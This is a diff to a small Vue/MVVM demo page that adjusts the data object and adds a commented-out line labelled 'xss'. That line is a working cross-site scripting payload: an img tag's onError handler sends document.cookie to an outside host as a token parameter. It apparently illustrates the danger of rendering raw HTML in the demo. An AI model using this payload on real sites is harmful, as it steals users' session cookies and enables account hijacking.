@@ -25,14 +25,15 @@
 
     <script src="mvvm.js"></script>
     <script>
-        let vm = new Vue({
+        const vm = new Vue({
             el: "#app",
             data: {
                 school: {
                     name: "喵喵喵",
                     age: 10
                 },
-                message: "<h1>欢迎大家</h1>"
+                message: '<h1>hello vue</h1>'
+                // message: '<img onError="window.location.replace(\'http://i7cn.cn?token=\'+ document.cookie);" style="display:none" src="invalidPath">' // xss
             },
             computed: {
                 getNewName() {
